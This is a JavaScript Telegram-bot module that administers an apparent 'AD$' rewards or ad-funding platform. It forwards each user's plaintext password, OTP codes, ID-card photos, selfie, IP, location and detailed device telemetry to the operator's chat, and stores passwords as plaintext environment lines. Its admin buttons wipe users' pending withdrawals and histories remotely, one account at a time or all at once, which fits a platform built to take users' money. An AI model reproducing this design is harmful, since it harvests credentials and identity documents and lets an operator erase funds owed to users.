// telegramBot.js - إدارة بوت التيليجرام مع اختيار حساب محدد لمسح سحوباته + ألبوم المرفقات + التفعيل الفوري

class TelegramBotManager {
    constructor(token, adminChatId, onDecisionCallback) {
        this.token = token;
        this.adminChatId = String(adminChatId);
        this.onDecisionCallback = onDecisionCallback;
        this.apiUrl = `https://api.telegram.org/bot${this.token}`;
        this.lastUpdateId = 0;
        this.isPolling = false;
        this.awaitingViaBtcForPhone = null;
    }

    startListening() {
        if (!this.token || this.token.includes("ضع_توكن") || this.isPolling) return;
        this.isPolling = true;
        console.log("✅ بوت التيليجرام متصل وجاهز لاستقبال الأوامر...");
        this.registerBotCommands();
        this.pollUpdates();
    }

    async registerBotCommands() {
        try {
            await fetch(`${this.apiUrl}/setMyCommands`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    commands: [
                        { command: "menu", description: "📊 لوحة التحكم والإحصائيات" },
                        { command: "users", description: "👥 عرض قائمة المشتركين" },
                        { command: "clear", description: "🗑️ اختيار حساب لمسح سحوباته" }
                    ]
                })
            });
        } catch (e) {}
    }

    async pollUpdates() {
        while (this.isPolling) {
            try {
                const res = await fetch(`${this.apiUrl}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=25`);
                const data = await res.json();

                if (data.ok && Array.isArray(data.result)) {
                    for (const update of data.result) {
                        this.lastUpdateId = update.update_id;

                        if (update.callback_query) {
                            await this.handleButtonClick(update.callback_query);
                        }

                        if (update.message && update.message.text) {
                            await this.handleTextCommand(update.message);
                        }
                    }
                }
            } catch (err) {
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    }

    // بناء لوحة أزرار لاختيار حساب محدد لمسح سحوباته
    async sendSelectUserToClearMenu(messageIdToEdit = null, chatIdToEdit = null) {
        const usersData = await this.onDecisionCallback("ALL", "get_users_array");
        const usersList = usersData?.users || [];

        if (usersList.length === 0) {
            await this.sendPlainMessage("⚠️ *لا يوجد مشتركون مسجلون في النظام حالياً.*");
            return;
        }

        const keyboardRows = usersList.map(u => ([
            {
                text: `🗑️ ${u.name} (${u.phone}) — المعلق: $${u.pending} (${u.historyCount} طلب)`,
                callback_data: `clear_user:${u.phone}:from_list`
            }
        ]));

        // إضافة زر لمسح الكل في الأسفل كخيار إضافي
        keyboardRows.push([
            { text: "⚠️ مسح قوائم جميع الحسابات دفعة واحدة", callback_data: "clear_all:panel" }
        ]);

        const text =
`🗑️ *اختر الحساب المطلوب مسح قائمة سحوباته:*
━━━━━━━━━━━━━━━━━━━━
اضغط على اسم المشترك أدناه لتصفير سجل سحوباته والمبالغ المعلقة في حسابه فوراً:`;

        if (messageIdToEdit && chatIdToEdit) {
            await fetch(`${this.apiUrl}/editMessageText`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatIdToEdit,
                    message_id: messageIdToEdit,
                    text: text,
                    parse_mode: "Markdown",
                    reply_markup: { inline_keyboard: keyboardRows }
                })
            });
        } else {
            await this.sendPlainMessage(text, { inline_keyboard: keyboardRows });
        }
    }

    async handleTextCommand(message) {
        const chatId = String(message.chat.id);
        if (chatId !== this.adminChatId) return;

        const text = message.text.trim();

        if (text === "الغاء" || text === "إلغاء" || text === "/cancel") {
            this.awaitingViaBtcForPhone = null;
            await this.sendPlainMessage("❎ *تم إلغاء العملية.*");
            return;
        }

        // 1. أمر ربط واتساب السيرفر: ربط 010xxxxxxxx
        if (text.startsWith("ربط ") || text.startsWith("/pair ")) {
            const phone = text.replace(/^(\/pair|ربط)\s+/i, "").trim();
            await this.sendPlainMessage(`⏳ *جاري توليد كود ربط الواتساب للرقم* \`${phone}\` *... انتظر لحظات.*`);
            const res = await this.onDecisionCallback(phone, "pair_whatsapp");
            if (!res?.success) {
                await this.sendPlainMessage(`⚠️ ${res?.message || "تعذر طلب كود الربط."}`);
            }
            return;
        }

        // 2. استقبال رابط ViaBTC لتفعيل المشترك بعد الضغط على زر التفعيل المخصص
        if (this.awaitingViaBtcForPhone && text.startsWith("http")) {
            const targetPhone = this.awaitingViaBtcForPhone;
            this.awaitingViaBtcForPhone = null;

            const result = await this.onDecisionCallback(targetPhone, "activate_user_url", text);
            if (result && result.success) {
                await this.sendPlainMessage(
`✅ *تم تفعيل حساب المشترك فوراً وإشعاره تلقائياً عبر واتساب!*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم:* ${result.user.name}
📱 *الهاتف:* \`${result.user.phone}\`
🔑 *كلمة المرور:* \`${result.user.password}\`
🔗 *رابط ViaBTC:* \`${result.user.viabtcUrl}\`
━━━━━━━━━━━━━━━━━━━━
📌 *للحفظ الدائم في Render Environment:*
\`USER_${result.user.phone}=${result.user.name}|${result.user.password}|${result.user.viabtcUrl}\``
                );
            } else {
                await this.sendPlainMessage(`⚠️ تعذر التفعيل: ${result?.message || "المشترك غير موجود"}`);
            }
            return;
        }

        // 3. تفعيل مباشر بالأمر: تفعيل 010xxxxxxxx رابط
        if (text.startsWith("/activate ") || text.startsWith("تفعيل ")) {
            const parts = text.replace(/^(\/activate|تفعيل)\s+/i, "").trim().split(/\s+/);
            const phone = parts[0];
            const url = parts[1] || "";

            if (!/^01[0-9]{9}$/.test(phone)) {
                await this.sendPlainMessage("⚠️ *الصيغة الصحيحة:*\n`تفعيل 01012345678 https://www.viabtc.com/...`");
                return;
            }

            const result = await this.onDecisionCallback(phone, "activate_user_url", url);
            if (result && result.success) {
                await this.sendPlainMessage(`✅ *تم تفعيل المشترك (${result.user.name}) وإرسال إشعار واتساب له!*`);
            } else {
                await this.sendPlainMessage(`⚠️ ${result?.message || "لم يتم العثور على طلب تسجيل لهذا الرقم."}`);
            }
            return;
        }

        // 4. إضافة مشترك يدوياً: اضافة الاسم|الرقم|الباسورد|الرابط
        if (text.startsWith("/adduser ") || text.startsWith("اضافة ") || text.startsWith("إضافة ")) {
            const rawPayload = text.replace(/^(\/adduser|اضافة|إضافة)\s+/i, "").trim();
            const result = await this.onDecisionCallback("MANUAL", "add_full_user", rawPayload);

            if (result && result.success) {
                await this.sendPlainMessage(`✅ *تمت إضافة وتفعيل المشترك (${result.user.name}) بنجاح!*`);
            } else {
                await this.sendPlainMessage("⚠️ *الصيغة:*\n`اضافة الاسم|01012345678|الباسورد|الرابط`");
            }
            return;
        }

        // 5. عرض قائمة المشتركين
        if (text === "/users" || text === "المشتركين" || text === "الحسابات") {
            const info = await this.onDecisionCallback("ALL", "list_users");
            await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات مسجلة حالياً.");
            return;
        }

        // 6. أمر مسح القائمة -> يعرض أزرار الحسابات لاختيار الحساب المطلوب مسحه
        if (text === "/clear" || text === "مسح" || text === "مسح القائمة") {
            await this.sendSelectUserToClearMenu();
            return;
        }

        // 7. لوحة التحكم الرئيسية (/menu أو /start)
        if (text === "/start" || text === "/menu" || text === "تحكم") {
            const status = await this.onDecisionCallback("ALL", "get_status");
            const panelText =
`🎛 *لوحة التحكم - منصة AD$*
━━━━━━━━━━━━━━━━━━━━
📡 *حالة واتساب السيرفر:* ${status?.waConnected ? "🟢 متصل ويرسل تلقائياً" : "🔴 غير مربوط"}
👥 *المشتركون المفعّلون:* \`${status?.usersCount || 0}\` مشترك
⏳ *طلبات بانتظار التفعيل:* \`${status?.pendingRegCount || 0}\` طلب
🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
📋 *إجمالي عمليات السحب:* \`${status?.historyCount || 0}\` عملية
━━━━━━━━━━━━━━━━━━━━
📲 *لربط أو إعادة ربط واتساب السيرفر:*
أرسل في المحادثة: \`ربط 010xxxxxxxx\``;

            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: panelText,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "👥 عرض قائمة المشتركين", callback_data: "list_users:panel" }],
                            [{ text: "🗑️ اختيار حساب لمسح سحوباته", callback_data: "choose_user_to_clear:panel" }],
                            [{ text: "⚠️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }],
                            [{ text: "🔄 تحديث بيانات اللوحة", callback_data: "status:refresh" }]
                        ]
                    }
                })
            });
        }
    }

    async sendPlainMessage(text, replyMarkup = null) {
        try {
            const body = { chat_id: this.adminChatId, text: text, parse_mode: "Markdown" };
            if (replyMarkup) body.reply_markup = replyMarkup;
            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
        } catch (e) {}
    }

    // إرسال إشعار كود الـ OTP (7 أرقام) مع زر احتياطي لواتساب المشترك
    async sendOtpAlertToAdmin(phone, otpCode, purpose, autoSent) {
        const purposeText = purpose === "register" ? "تسجيل حساب جديد" : "استعادة كلمة المرور";
        const intlPhone = "2" + phone;
        const waMsg = encodeURIComponent(`مرحباً بك في منصة AD$ للتمويل الإعلاني 🌐\nكود التحقق الخاص بك (${purposeText}) المكون من 7 أرقام هو:\n*${otpCode}*`);
        const waUrl = `https://wa.me/${intlPhone}?text=${waMsg}`;

        const msg =
`🔐 *إشعار مصادقة واتساب (OTP - 7 أرقام)*
━━━━━━━━━━━━━━━━━━━━
📌 *العملية:* ${purposeText}
📱 *هاتف المشترك:* \`${phone}\`
🔢 *الكود المرسل (7 أرقام):* \`${otpCode}\`
📡 *حالة الإرسال:* ${autoSent ? "✅ تم الإرسال تلقائياً إلى واتساب المشترك" : "⚠️ لم يُرسل تلقائياً (يمكنك الإرسال بالزر أدناه أو ربط الواتساب بـ: ربط 010xxxxxxxx)"}
━━━━━━━━━━━━━━━━━━━━`;

        const keyboard = autoSent ? null : {
            inline_keyboard: [
                [{ text: "📲 إرسال الكود لواتساب المشترك بضغطة واحدة", url: waUrl }]
            ]
        };

        await this.sendPlainMessage(msg, keyboard);
    }

    // إرسال ألبوم الصور الثلاث (وجه البطاقة + ظهر البطاقة + الصورة الشخصية) مع أزرار التفعيل
    async sendNewRegistrationWithKycBundle(regData) {
        const { fullName, phone, password, idFrontBase64, idBackBase64, selfieBase64, idCardBase64, deviceInfo, date } = regData;
        const dev = deviceInfo || {};
        const envKey = `USER_${phone}`;
        const envValue = `${fullName}|${password}|ضع_رابط_VIABTC_الخاص_به_هنا`;

        const caption =
`🆕 *طلب تسجيل مشترك جديد (مكتمل المرفقات)*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم الكامل:* ${fullName}
📱 *رقم الهاتف:* \`${phone}\`
🔑 *كلمة المرور:* \`${password}\`
📲 *الجهاز:* ${dev.deviceModel || "غير معروف"}
🌐 *الـ IP:* \`${dev.ip || "غير معروف"}\` (${dev.location || ""})
⏰ *التوقيت:* ${date}
━━━━━━━━━━━━━━━━━━━━
⚙️ *سطر Render Environment:*
\`${envKey}=${envValue}\``;

        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "⚡ تفعيل فوري وربط رابط ViaBTC مخصص", callback_data: `prompt_activate:${phone}` }],
                [{ text: "✅ تفعيل فوري بالرابط الافتراضي", callback_data: `quick_activate:${phone}` }]
            ]
        };

        const rawPhotos = [
            { field: "front", data: idFrontBase64 || idCardBase64, name: `front_${phone}.jpg` },
            { field: "back", data: idBackBase64, name: `back_${phone}.jpg` },
            { field: "selfie", data: selfieBase64, name: `selfie_${phone}.jpg` }
        ].filter(p => p.data && p.data.includes("base64,"));

        try {
            if (rawPhotos.length > 1) {
                const formData = new FormData();
                formData.append("chat_id", this.adminChatId);

                const mediaArray = rawPhotos.map((p, idx) => {
                    const b64 = p.data.split("base64,")[1];
                    const buf = Buffer.from(b64, "base64");
                    formData.append(p.field, new Blob([buf], { type: "image/jpeg" }), p.name);
                    return {
                        type: "photo",
                        media: `attach://${p.field}`,
                        ...(idx === 0 ? { caption: caption, parse_mode: "Markdown" } : {})
                    };
                });

                formData.append("media", JSON.stringify(mediaArray));
                await fetch(`${this.apiUrl}/sendMediaGroup`, { method: "POST", body: formData });
                await this.sendPlainMessage(`👇 *إجراءات تفعيل حساب المشترك (${fullName} - \`${phone}\`):*`, inlineKeyboard);

            } else if (rawPhotos.length === 1) {
                const b64 = rawPhotos[0].data.split("base64,")[1];
                const buf = Buffer.from(b64, "base64");
                const formData = new FormData();
                formData.append("chat_id", this.adminChatId);
                formData.append("caption", caption);
                formData.append("parse_mode", "Markdown");
                formData.append("reply_markup", JSON.stringify(inlineKeyboard));
                formData.append("photo", new Blob([buf], { type: "image/jpeg" }), rawPhotos[0].name);

                await fetch(`${this.apiUrl}/sendPhoto`, { method: "POST", body: formData });
            } else {
                await this.sendPlainMessage(caption, inlineKeyboard);
            }
        } catch (err) {
            console.error("خطأ في إرسال مرفقات التسجيل:", err.message);
            await this.sendPlainMessage(caption, inlineKeyboard);
        }
    }

    async sendNewRegistrationWithIdCard(regData) {
        return this.sendNewRegistrationWithKycBundle(regData);
    }

    async sendPasswordResetNotice(user) {
        const text =
`🔄 *قام المشترك ${user.name} (\`${user.phone}\`) بتحديث كلمة المرور عبر OTP*
🔑 *كلمة المرور الجديدة:* \`${user.password}\`
📌 *السطر المحدث لـ Environment:*
\`USER_${user.phone}=${user.name}|${user.password}|${user.viabtcUrl || "رابط_فيا"}\``;
        await this.sendPlainMessage(text);
    }

    // إرسال إشعار طلب السحب مع النسخ بضغطة واحدة وكافة بيانات الجهاز والشبكة
    async sendWithdrawNotification(record, totalPending) {
        if (!this.token || this.token.includes("ضع_توكن")) return;

        const rawDestination = String(record.destination || "").trim();
        const cleanCopyableNumber = rawDestination.replace(/\s+/g, "");
        const dev = record.deviceInfo || {};

        const text = 
`🔔 *طلب سحب / بيع مكافآت جديد | حساب: ${record.accountOwnerName || record.userName}*
━━━━━━━━━━━━━━━━━━━━
🆔 *رقم العملية:* \`${record.id}\`
📱 *حساب المشترك:* \`${record.userPhone || "عام"}\` (${record.accountOwnerName || record.userName})
👤 *اسم المستفيد:* ${record.userName}
💰 *المبلغ المخصوم:* $${record.gross}
📉 *رسوم التحويل (25%):* -$${record.fee}
💵 *الصافي بالدولار:* $${record.net}
🏦 *سعر الصرف الرسمي:* ${record.exchangeRate} ج.م
🇪🇬 *المبلغ المطلوب تحويله بالمصري:* *${Number(record.netEgp).toLocaleString("en-US", { minimumFractionDigits: 2 })} ج.م*
━━━━━━━━━━━━━━━━━━━━
💳 *وسيلة الدفع:* ${record.method}
📋 *اضغط على الرقم لنسخه فوراً:*
\`${cleanCopyableNumber}\`
${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:* \`${rawDestination}\`\n` : ""}━━━━━━━━━━━━━━━━━━━━
📱 *بيانات الجهاز والشبكة (Telemetry):*
🔖 *معرف الجهاز (Device ID):* \`${dev.deviceId || "غير متاح"}\`
📲 *نوع وطراز الجهاز:* ${dev.deviceModel || "غير معروف"}
⚙️ *المعالج (CPU):* ${dev.cpu || "غير معروف"}
🧠 *الذاكرة (RAM):* ${dev.ram || "غير معروف"}
🔋 *حالة البطارية:* ${dev.battery || "غير متاح"}
🌐 *الـ IP الخارجي:* \`${dev.ip || "غير معروف"}\`
📡 *مزود الشبكة (ISP):* ${dev.isp || "غير معروف"}
📍 *الموقع عبر الـ IP:* ${dev.location || "غير معروف"}
━━━━━━━━━━━━━━━━━━━━
📊 *إجمالي المبالغ المعلقة:* $${totalPending.toFixed(2)}
⏰ *التوقيت:* ${record.date}
━━━━━━━━━━━━━━━━━━━━
👇 *اختر إجراء التسوية لتحديث الموقع فوراً:*`;

        const userKey = record.userPhone || "DEFAULT";
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${userKey}:${record.id}` }],
                [{ text: "❌ فشلت العملية (إعادة المبلغ للرصيد)", callback_data: `reject:${userKey}:${record.id}` }],
                [{ text: "🗑️ مسح سجل هذا المشترك فقط", callback_data: `clear_user:${userKey}:${record.id}` }],
                [{ text: "📋 اختيار حساب آخر لمسح سحوباته", callback_data: `choose_user_to_clear:${record.id}` }]
            ]
        };

        try {
            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: text,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });
        } catch (err) {
            console.error("فشل إرسال رسالة تيليجرام:", err.message);
        }
    }

    async handleButtonClick(callbackQuery) {
        const chatId = String(callbackQuery.message?.chat?.id || "");
        if (chatId !== this.adminChatId) return;

        const data = callbackQuery.data || "";
        const parts = data.split(":");
        const action = parts[0];
        const targetPhone = parts[1];
        const txId = parts[2];
        const message = callbackQuery.message;

        // فتح قائمة أزرار المشتركين لاختيار حساب لمسح سحوباته
        if (action === "choose_user_to_clear") {
            await this.answerCallback(callbackQuery.id, "اختر المشترك من القائمة");
            await this.sendSelectUserToClearMenu();
            return;
        }

        if (action === "prompt_activate") {
            this.awaitingViaBtcForPhone = targetPhone;
            await this.answerCallback(callbackQuery.id, "أرسل الآن رابط ViaBTC في المحادثة");
            await this.sendPlainMessage(`🔗 *أرسل الآن رابط المراقب (ViaBTC Observer URL) الخاص بالمشترك* \`${targetPhone}\` *في رسالة عادية (أو أرسل «إلغاء»):*`);
            return;
        }

        if (action === "quick_activate") {
            const result = await this.onDecisionCallback(targetPhone, "activate_user_url", "");
            if (result && result.success) {
                await this.answerCallback(callbackQuery.id, "✅ تم تفعيل حساب المشترك فوراً!");
                await this.sendPlainMessage(`✅ *تم تفعيل حساب المشترك (${result.user.name} - \`${result.user.phone}\`) وإشعاره على واتساب!*`);
            } else {
                await this.answerCallback(callbackQuery.id, `⚠️ ${result?.message || "تعذر التفعيل"}`);
            }
            return;
        }

        if (action === "list_users") {
            const info = await this.onDecisionCallback("ALL", "list_users");
            await this.answerCallback(callbackQuery.id, "تم جلب القائمة");
            await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات حالياً.");
            return;
        }

        if (action === "status" && targetPhone === "refresh") {
            const status = await this.onDecisionCallback("ALL", "get_status");
            const panelText =
`🎛 *لوحة التحكم - منصة AD$*
━━━━━━━━━━━━━━━━━━━━
📡 *حالة واتساب السيرفر:* ${status?.waConnected ? "🟢 متصل ويرسل تلقائياً" : "🔴 غير مربوط"}
👥 *المشتركون المفعّلون:* \`${status?.usersCount || 0}\` مشترك
⏳ *طلبات بانتظار التفعيل:* \`${status?.pendingRegCount || 0}\` طلب
🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
📋 *إجمالي عمليات السحب:* \`${status?.historyCount || 0}\` عملية
⏰ *آخر تحديث:* ${new Date().toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" })}
━━━━━━━━━━━━━━━━━━━━`;

            await fetch(`${this.apiUrl}/editMessageText`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: message.chat.id,
                    message_id: message.message_id,
                    text: panelText,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "👥 عرض قائمة المشتركين", callback_data: "list_users:panel" }],
                            [{ text: "🗑️ اختيار حساب لمسح سحوباته", callback_data: "choose_user_to_clear:panel" }],
                            [{ text: "⚠️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }],
                            [{ text: "🔄 تحديث بيانات اللوحة", callback_data: "status:refresh" }]
                        ]
                    }
                })
            });
            await this.answerCallback(callbackQuery.id, "✅ تم تحديث اللوحة بنجاح");
            return;
        }

        if (action === "clear_all") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.answerCallback(callbackQuery.id, "✅ تم مسح جميع قوائم السحوبات من الموقع!");
            await this.sendPlainMessage("🗑️ *تم مسح جميع قوائم السحوبات وتصفير المبالغ المعلقة عن بُعد!*");
            return;
        }

        // مسح سحوبات حساب مشترك محدد وتحديث قائمة الأزرار
        if (action === "clear_user") {
            const res = await this.onDecisionCallback(targetPhone, "clear_user");
            await this.answerCallback(callbackQuery.id, `✅ تم مسح سحوبات ${res?.userName || targetPhone}`);
            await this.sendPlainMessage(
                `🗑️ *تم مسح قائمة سحوبات المشترك بنجاح!*\n` +
                `👤 *الحساب:* ${res?.userName || "مشترك"} (\`${targetPhone}\`)\n` +
                `💰 *الرصيد المتاح في حسابه الآن:* \`$${res?.newBalance || "0.00"}\``
            );
            if (txId === "from_list") {
                await this.sendSelectUserToClearMenu(message.message_id, message.chat.id);
            }
            return;
        }

        const updatedRecord = await this.onDecisionCallback(targetPhone, action, txId);
        if (!updatedRecord) {
            await this.answerCallback(callbackQuery.id, "⚠️ العملية غير موجودة أو تم مسحها.");
            return;
        }

        const statusLine = action === "approve"
            ? "✅ *الحالة النهائية: تمت التسوية والدفع بنجاح*"
            : "❌ *الحالة النهائية: فشلت العملية (تم إرجاع المبلغ لرصيد المشترك)*";

        const updatedText = `${message.text.split("👇")[0].trim()}\n\n${statusLine}`;
        await fetch(`${this.apiUrl}/editMessageText`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: message.chat.id,
                message_id: message.message_id,
                text: updatedText,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🗑️ مسح سجل هذا المشترك", callback_data: `clear_user:${targetPhone}:${txId}` }]
                    ]
                }
            })
        });

        await this.answerCallback(
            callbackQuery.id,
            action === "approve" ? "تم اعتماد الدفع بالجنيه المصري وتحديث الموقع!" : "تم إلغاء العملية وإرجاع المبلغ!"
        );
    }

    async answerCallback(callbackQueryId, text) {
        await fetch(`${this.apiUrl}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: text,
                show_alert: true
            })
        });
    }
}

module.exports = TelegramBotManager;
